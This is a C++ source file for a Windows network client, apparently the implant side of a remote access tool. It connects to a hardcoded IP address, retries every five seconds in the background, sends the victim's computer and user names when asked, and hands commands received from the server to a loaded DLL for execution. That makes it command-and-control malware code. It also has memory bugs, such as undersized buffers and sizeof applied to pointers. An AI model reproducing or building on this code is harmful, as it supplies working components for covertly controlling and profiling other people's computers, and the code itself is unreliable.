#include "ConnectionManager.h"
using namespace std;

char *szServer = "213.207.159.45";
int nPort = 100;
char szHistory[10000];

SOCKET Socket = NULL;
SOCKADDR_IN SockAddr;

void ConnectionManager::SetupSocket(HWND hWnd)
{
	// Set up Winsock
	WSADATA WsaDat;
	int nResult = WSAStartup(MAKEWORD(2, 2), &WsaDat);
	if (nResult != 0)
	{
		OutputDebugStringW(L"Winsock initialization failed");
		SendMessage(hWnd, WM_DESTROY, NULL, NULL);
		return;
	}

	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (Socket == INVALID_SOCKET)
	{
		OutputDebugStringW(L"Socket creation failed");
		return;
	}

	nResult = WSAAsyncSelect(Socket, hWnd, WM_SOCKET, (FD_CLOSE | FD_READ));
	if (nResult)
	{
		OutputDebugStringW(L"WSAAsyncSelect failed");
		SendMessage(hWnd, WM_DESTROY, NULL, NULL);
		return;
	}

	// Resolve IP address for hostname
	struct hostent *host;
	if ((host = gethostbyname(szServer)) == NULL)
	{
		OutputDebugStringW(L"Unable to resolve host name");
		SendMessage(hWnd, WM_DESTROY, NULL, NULL);
		return;
	}

	// Set up our socket address structure
	SockAddr.sin_port = htons(nPort);
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);


	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread_Start_TryConnect, this, 0, NULL);
}


void ConnectionManager::CloseSocketConnection()
{
	PostQuitMessage(0);
	shutdown(Socket, SD_BOTH);
	closesocket(Socket);
	WSACleanup();
}

void ConnectionManager::CloseSocket()
{
	closesocket(Socket);
}

string ConnectionManager::GetRecvData()
{
	char szIncoming[2048];
	ZeroMemory(szIncoming, sizeof(szIncoming));

	int inDataLength = recv(Socket, (char*)szIncoming, sizeof(szIncoming) / sizeof(szIncoming[0]), 0);

	string ret = szIncoming;
	return ret;
}

DWORD ConnectionManager::Thread_Start_TryConnect(LPVOID* param)
{
	ConnectionManager *myObj = (ConnectionManager*)param;
	myObj->TryConnect();
	return 0;
}

void ConnectionManager::TryConnect()
{
	try	
	{
		connect(Socket, (LPSOCKADDR)(&SockAddr), sizeof(SockAddr));
		Sleep(1000);

		char* out = new char[0];
		ZeroMemory(out, sizeof(out));
		int ret = send(Socket, out, sizeof(out) / sizeof(out[0]), 0);

		if (ret > 0)
			return;

	}
	catch (exception e)
	{

	}

	Sleep(5000);

	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Thread_Start_TryConnect, this, 0, NULL);

	return;
}

void ConnectionManager::SetLibraryManager(CoreLibraryManager* manager)
{
	_LibraryManager = manager;
}

Message ConnectionManager::ParseMessage(string szIncoming)
{
	//Need to packatize by spliting the json messages
	Message msg = Message();

	try
	{
		json jsonMessage = json::parse(szIncoming);
		msg.Code = jsonMessage["Code"].to_string();
		msg.Data = jsonMessage["Data"].to_string();

	}
	catch (exception e)
	{
		msg.Code = "Error";
		msg.Data = "";
	}


	return msg;

}

void ConnectionManager::HandleMessage(Message msg)
{

	if (msg.Code.compare("Error") == 0)
	{

		return;
	}
	else if (msg.Code.compare("\"Ping\"") == 0) // For some reason json parse also adds the extra "" character to the string 
	{
		Pong();
	}
	else if (msg.Code.compare("\"Request Info\"") == 0)
	{
		RequestInfo();
	}
	else if (msg.Code.compare("\"Command\"") == 0)
	{
		if (_LibraryManager->IsCoreDllLoaded())
		{
			try
			{
				_LibraryManager->ExecuteCommand(msg.Data);
			}
			catch (exception ex)
			{

			}
		}
	}
}

	void ConnectionManager::RequestInfo()
	{
		try
		{
			string Name = "PC Name: ";
			Name.append(getenv("COMPUTERNAME"));
			Name.append("   Usename: ");
			Name.append(getenv("USERNAME"));
				
			json msg;
			msg["Code"] = "Request Info";
			msg["Data"] = Name.c_str();


			std::string strOut = msg.to_string();    // {\"happy\":true,\"pi\":3.141}
			int size = strOut.length();

			char* out = new char[size];
			ZeroMemory(out, sizeof(out));

			strcpy(out, strOut.c_str());
			int ret = send(Socket, out, size, 0);
		}
		catch (exception e)
		{



		}
	
	}

	void ConnectionManager::Pong()
	{
		try
		{
			json msg;
			msg["Code"] = "Pong";
			msg["Data"] = "";

			std::string strOut = msg.to_string(); 
			int size = strOut.length();

			char* out = new char[size];
			ZeroMemory(out, sizeof(out));

			strcpy(out, strOut.c_str());
			int ret = send(Socket, out, size, 0);
		}
		catch (exception e)
		{



		}
	}

